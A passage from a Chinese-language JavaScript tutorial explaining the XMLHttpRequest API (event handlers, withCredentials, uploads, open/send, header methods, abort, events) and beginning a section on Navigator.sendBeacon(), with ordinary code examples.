<li>XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了<code>abort()</code>方法）的监听函数</li>
<li>XMLHttpRequest.onerror：error 事件（请求失败）的监听函数</li>
<li>XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数</li>
<li>XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数</li>
<li>XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> responseText = xhr.responseText;</span><br><span class="line"> <span class="built_in">console</span>.log(responseText);</span><br><span class="line"> <span class="comment">// process the response.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onabort = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;The request was aborted&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onprogress = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.loaded);</span><br><span class="line">  <span class="built_in">console</span>.log(event.total);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;There was an error!&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>progress</code>事件的监听函数有一个事件对象参数，该对象有三个属性：<code>loaded</code>属性返回已经传输的数据量，<code>total</code>属性返回总的数据量，<code>lengthComputable</code>属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有<code>progress</code>事件的监听函数有参数，其他函数都没有参数。</p>
<p>注意，如果发生网络错误（比如服务器无法连通），<code>onerror</code>事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。</p>
<h5 id="5-2-11-XMLHttpRequest-withCredentials"><a href="#5-2-11-XMLHttpRequest-withCredentials" class="headerlink" title="5.2.11 XMLHttpRequest.withCredentials"></a>5.2.11 XMLHttpRequest.withCredentials</h5><p><code>XMLHttpRequest.withCredentials</code>属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为<code>false</code>，即向<code>example.com</code>发出跨域请求时，不会发送<code>example.com</code>设置在本机上的 Cookie（如果有的话）。</p>
<p>如果需要跨域 AJAX 请求发送 Cookie，需要<code>withCredentials</code>属性设为<code>true</code>。注意，同源的请求不需要设置这个属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://example.com/&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>为了让这个属性生效，服务器必须显式返回<code>Access-Control-Allow-Credentials</code>这个头信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p><code>withCredentials</code>属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果<code>withCredentials</code>属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。</p>
<p>注意，脚本总是遵守同源政策，无法从<code>document.cookie</code>或者 HTTP 回应的头信息之中，读取跨域的 Cookie，<code>withCredentials</code>属性不影响这一点。</p>
<h5 id="5-2-12-XMLHttpRequest-upload"><a href="#5-2-12-XMLHttpRequest-upload" class="headerlink" title="5.2.12 XMLHttpRequest.upload"></a>5.2.12 XMLHttpRequest.upload</h5><p>XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过<code>XMLHttpRequest.upload</code>属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。</p>
<p>假定网页上有一个<code>&lt;progress&gt;</code>元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;progress min=<span class="string">&quot;0&quot;</span> max=<span class="string">&quot;100&quot;</span> value=<span class="string">&quot;0&quot;</span>&gt;<span class="number">0</span>% complete&lt;/progress&gt;</span><br></pre></td></tr></table></figure>
<p>文件上传时，对<code>upload</code>属性指定<code>progress</code>事件的监听函数，即可获得上传的进度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">blobOrFile</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> progressBar = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;progress&#x27;</span>);</span><br><span class="line">  xhr.upload.onprogress = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.lengthComputable) &#123;</span><br><span class="line">      progressBar.value = (e.loaded / e.total) * <span class="number">100</span>;</span><br><span class="line">      <span class="comment">// 兼容不支持 &lt;progress&gt; 元素的老式浏览器</span></span><br><span class="line">      progressBar.textContent = progressBar.value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.send(blobOrFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upload(<span class="keyword">new</span> Blob([<span class="string">&#x27;hello world&#x27;</span>], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;));</span><br></pre></td></tr></table></figure>
<h4 id="5-3-XMLHttpRequest-的实例方法"><a href="#5-3-XMLHttpRequest-的实例方法" class="headerlink" title="5.3 XMLHttpRequest 的实例方法"></a>5.3 XMLHttpRequest 的实例方法</h4><h5 id="5-3-1-XMLHttpRequest-open"><a href="#5-3-1-XMLHttpRequest-open" class="headerlink" title="5.3.1 XMLHttpRequest.open()"></a>5.3.1 XMLHttpRequest.open()</h5><p><code>XMLHttpRequest.open()</code>方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> open(</span><br><span class="line">   string method,</span><br><span class="line">   string url,</span><br><span class="line">   optional boolean <span class="keyword">async</span>,</span><br><span class="line">   optional string user,</span><br><span class="line">   optional string password</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>method</code>：表示 HTTP 动词方法，比如<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>等。</li>
<li><code>url</code>: 表示请求发送目标 URL。</li>
<li><code>async</code>: 布尔值，表示请求是否为异步，默认为<code>true</code>。如果设为<code>false</code>，则<code>send()</code>方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为<code>false</code>。</li>
<li><code>user</code>：表示用于认证的用户名，默认为空字符串。该参数可选。</li>
<li><code>password</code>：表示用于认证的密码，默认为空字符串。该参数可选。</li>
</ul>
<p>注意，如果对使用过<code>open()</code>方法的 AJAX 请求，再次使用这个方法，等同于调用<code>abort()</code>，即终止请求。</p>
<p>下面发送 POST 请求的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="built_in">encodeURI</span>(<span class="string">&#x27;someURL&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h5 id="5-3-2-XMLHttpRequest-send"><a href="#5-3-2-XMLHttpRequest-send" class="headerlink" title="5.3.2 XMLHttpRequest.send()"></a>5.3.2 XMLHttpRequest.send()</h5><p><code>XMLHttpRequest.send()</code>方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。</p>
<p>下面是 GET 请求的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;http://www.example.com/?id=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(id),</span><br><span class="line">  <span class="literal">true</span></span><br><span class="line">);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>GET</code>请求的参数，作为查询字符串附加在 URL 后面。</p>
<p>下面是发送 POST 请求的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&#x27;email=&#x27;</span></span><br><span class="line">  + <span class="built_in">encodeURIComponent</span>(email)</span><br><span class="line">  + <span class="string">&#x27;&amp;password=&#x27;</span></span><br><span class="line">  + <span class="built_in">encodeURIComponent</span>(password);</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.send(data);</span><br></pre></td></tr></table></figure>
<p>注意，所有 XMLHttpRequest 的监听事件，都必须在<code>send()</code>方法调用之前设定。</p>
<p><code>send</code>方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> send();</span><br><span class="line"><span class="keyword">void</span> send(ArrayBufferView data);</span><br><span class="line"><span class="keyword">void</span> send(Blob data);</span><br><span class="line"><span class="keyword">void</span> send(Document data);</span><br><span class="line"><span class="keyword">void</span> send(<span class="built_in">String</span> data);</span><br><span class="line"><span class="keyword">void</span> send(FormData data);</span><br></pre></td></tr></table></figure>
<p>如果<code>send()</code>发送 DOM 对象，在发送之前，数据会先被串行化。如果发送二进制数据，最好是发送<code>ArrayBufferView</code>或<code>Blob</code>对象，这使得通过 Ajax 上传文件成为可能。</p>
<p>下面是发送表单数据的例子。<code>FormData</code>对象可以用于构造表单数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line">formData.append(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;zhangsan@example.com&#x27;</span>);</span><br><span class="line">formData.append(<span class="string">&#x27;birthDate&#x27;</span>, <span class="number">1940</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>FormData</code>对象构造了表单数据，然后使用<code>send()</code>方法发送。它的效果与发送下面的表单数据是一样的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">&#x27;registration&#x27;</span> name=<span class="string">&#x27;registration&#x27;</span> action=<span class="string">&#x27;/register&#x27;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;username&#x27;</span> value=<span class="string">&#x27;张三&#x27;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&#x27;email&#x27;</span> name=<span class="string">&#x27;email&#x27;</span> value=<span class="string">&#x27;zhangsan@example.com&#x27;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&#x27;number&#x27;</span> name=<span class="string">&#x27;birthDate&#x27;</span> value=<span class="string">&#x27;1940&#x27;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&#x27;submit&#x27;</span> onclick=<span class="string">&#x27;return sendForm(this.form);&#x27;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>下面的例子是使用<code>FormData</code>对象加工表单数据，然后再发送。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendForm</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> formData = <span class="keyword">new</span> FormData(form);</span><br><span class="line">  formData.append(<span class="string">&#x27;csrf&#x27;</span>, <span class="string">&#x27;e69a18d7db1286040586e6da1950128c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;POST&#x27;</span>, form.action, <span class="literal">true</span>);</span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;;</span><br><span class="line">  xhr.send(formData);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#registration&#x27;</span>);</span><br><span class="line">sendForm(form);</span><br></pre></td></tr></table></figure>
<h5 id="5-3-3-XMLHttpRequest-setRequestHeader"><a href="#5-3-3-XMLHttpRequest-setRequestHeader" class="headerlink" title="5.3.3 XMLHttpRequest.setRequestHeader()"></a>5.3.3 XMLHttpRequest.setRequestHeader()</h5><p><code>XMLHttpRequest.setRequestHeader()</code>方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在<code>open()</code>之后、<code>send()</code>之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。</p>
<p>该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Length&#x27;</span>, <span class="built_in">JSON</span>.stringify(data).length);</span><br><span class="line">xhr.send(<span class="built_in">JSON</span>.stringify(data));</span><br></pre></td></tr></table></figure>
<p>上面代码首先设置头信息<code>Content-Type</code>，表示发送 JSON 格式的数据；然后设置<code>Content-Length</code>，表示数据长度；最后发送 JSON 数据。</p>
<h5 id="5-3-4-XMLHttpRequest-overrideMimeType"><a href="#5-3-4-XMLHttpRequest-overrideMimeType" class="headerlink" title="5.3.4 XMLHttpRequest.overrideMimeType()"></a>5.3.4 XMLHttpRequest.overrideMimeType()</h5><p><code>XMLHttpRequest.overrideMimeType()</code>方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是<code>text/xml</code>，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成<code>text/plain</code>，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.overrideMimeType(<span class="string">&#x27;text/plain&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意，该方法必须在<code>send()</code>方法之前调用。</p>
<p>修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用<code>responseType</code>属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用<code>overrideMimeType()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arraybuffer = xhr.response;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">xhr.responseType = <span class="string">&#x27;arraybuffer&#x27;</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<h5 id="5-3-5-XMLHttpRequest-getResponseHeader"><a href="#5-3-5-XMLHttpRequest-getResponseHeader" class="headerlink" title="5.3.5 XMLHttpRequest.getResponseHeader()"></a>5.3.5 XMLHttpRequest.getResponseHeader()</h5><p><code>XMLHttpRequest.getResponseHeader()</code>方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回<code>null</code>。该方法的参数不区分大小写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHeaderTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.getResponseHeader(<span class="string">&quot;Last-Modified&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;HEAD&#x27;</span>, <span class="string">&#x27;yourpage.html&#x27;</span>);</span><br><span class="line">xhr.onload = getHeaderTime;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。</p>
<h5 id="5-3-6-XMLHttpRequest-getAllResponseHeaders"><a href="#5-3-6-XMLHttpRequest-getAllResponseHeaders" class="headerlink" title="5.3.6 XMLHttpRequest.getAllResponseHeaders()"></a>5.3.6 XMLHttpRequest.getAllResponseHeaders()</h5><p><code>XMLHttpRequest.getAllResponseHeaders()</code>方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用<code>CRLF</code>分隔（回车+换行），如果没有收到服务器回应，该属性为<code>null</code>。如果发生网络错误，该属性为空字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;foo.txt&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> headers = xhr.getAllResponseHeaders();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">date: Fri, <span class="number">08</span> Dec <span class="number">2017</span> <span class="number">21</span>:<span class="number">04</span>:<span class="number">30</span> GMT\r\n</span><br><span class="line">content-encoding: gzip\r\n</span><br><span class="line">x-content-type-options: nosniff\r\n</span><br><span class="line">server: meinheld/<span class="number">0.6</span><span class="number">.1</span>\r\n</span><br><span class="line">x-frame-options: DENY\r\n</span><br><span class="line">content-type: text/html; charset=utf-<span class="number">8</span>\r\n</span><br><span class="line">connection: keep-alive\r\n</span><br><span class="line">strict-transport-security: max-age=<span class="number">63072000</span>\r\n</span><br><span class="line">vary: Cookie, Accept-Encoding\r\n</span><br><span class="line">content-length: <span class="number">6502</span>\r\n</span><br><span class="line">x-xss-protection: <span class="number">1</span>; mode=block\r\n</span><br></pre></td></tr></table></figure>
<p>然后，对这个字符串进行处理。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = headers.trim().split(<span class="regexp">/[\r\n]+/</span>);</span><br><span class="line"><span class="keyword">var</span> headerMap = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">line</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parts = line.split(<span class="string">&#x27;: &#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> header = parts.shift();</span><br><span class="line">  <span class="keyword">var</span> value = parts.join(<span class="string">&#x27;: &#x27;</span>);</span><br><span class="line">  headerMap[header] = value;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">headerMap[<span class="string">&#x27;content-length&#x27;</span>] <span class="comment">// &quot;6502&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="5-3-7-XMLHttpRequest-abort"><a href="#5-3-7-XMLHttpRequest-abort" class="headerlink" title="5.3.7 XMLHttpRequest.abort()"></a>5.3.7 XMLHttpRequest.abort()</h5><p><code>XMLHttpRequest.abort()</code>方法用来终止已经发出的 HTTP 请求。调用这个方法以后，<code>readyState</code>属性变为<code>4</code>，<code>status</code>属性变为<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.example.com/page.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr) &#123;</span><br><span class="line">    xhr.abort();</span><br><span class="line">    xhr = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">5000</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码在发出5秒之后，终止一个 AJAX 请求。</p>
<h4 id="5-4-XMLHttpRequest-实例的事件"><a href="#5-4-XMLHttpRequest-实例的事件" class="headerlink" title="5.4 XMLHttpRequest 实例的事件"></a>5.4 XMLHttpRequest 实例的事件</h4><h5 id="5-4-1-readyStateChange-事件"><a href="#5-4-1-readyStateChange-事件" class="headerlink" title="5.4.1 readyStateChange 事件"></a>5.4.1 readyStateChange 事件</h5><p><code>readyState</code>属性的值发生改变，就会触发 readyStateChange 事件。</p>
<p>我们可以通过<code>onReadyStateChange</code>属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为<code>4</code>的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。</p>
<h5 id="5-4-2-progress-事件"><a href="#5-4-2-progress-事件" class="headerlink" title="5.4.2 progress 事件"></a>5.4.2 progress 事件</h5><p>上传文件时，XMLHttpRequest 实例对象本身和实例的<code>upload</code>属性，都有一个<code>progress</code>事件，会不断返回上传的进度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateProgress</span> (<span class="params">oEvent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (oEvent.lengthComputable) &#123;</span><br><span class="line">    <span class="keyword">var</span> percentComplete = oEvent.loaded / oEvent.total;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;无法计算进展&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;progress&#x27;</span>, updateProgress);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br></pre></td></tr></table></figure>
<h5 id="5-4-3-load-事件、error-事件、abort-事件"><a href="#5-4-3-load-事件、error-事件、abort-事件" class="headerlink" title="5.4.3 load 事件、error 事件、abort 事件"></a>5.4.3 load 事件、error 事件、abort 事件</h5><p>load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;load&#x27;</span>, transferComplete);</span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;error&#x27;</span>, transferFailed);</span><br><span class="line">xhr.addEventListener(<span class="string">&#x27;abort&#x27;</span>, transferCanceled);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferComplete</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;数据接收完毕&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFailed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;数据接收出错&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferCanceled</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;用户取消接收&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="5-4-4-loadend-事件"><a href="#5-4-4-loadend-事件" class="headerlink" title="5.4.4 loadend 事件"></a>5.4.4 loadend 事件</h5><p><code>abort</code>、<code>load</code>和<code>error</code>这三个事件，会伴随一个<code>loadend</code>事件，表示请求结束，但不知道其是否成功。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.addEventListener(<span class="string">&#x27;loadend&#x27;</span>, loadEnd);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadEnd</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;请求结束，状态未知&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="5-4-5-timeout-事件"><a href="#5-4-5-timeout-事件" class="headerlink" title="5.4.5 timeout 事件"></a>5.4.5 timeout 事件</h5><p>服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见<code>timeout</code>属性一节。</p>
<h4 id="5-5-Navigator-sendBeacon"><a href="#5-5-Navigator-sendBeacon" class="headerlink" title="5.5 Navigator.sendBeacon()"></a>5.5 Navigator.sendBeacon()</h4><p>用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在<code>unload</code>事件或<code>beforeunload</code>事件的监听函数里面，使用<code>XMLHttpRequest</code>对象发送数据。但是，这样做不是很可靠，因为<code>XMLHttpRequest</code>对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。</p>
<p>解决方法就是<code>unload</code>事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/log&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">  xhr.send(<span class="string">&#x27;foo=bar&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  log();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// a time-consuming operation</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> m = <span class="number">1</span>; m &lt; <span class="number">10000</span>; m++) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，强制执行了一次双重循环，拖长了<code>unload</code>事件的执行时间，导致异步 AJAX 能够发送成功。</p>
<p>类似的还可以使用<code>setTimeout</code>。下面是追踪用户点击的例子。</p>
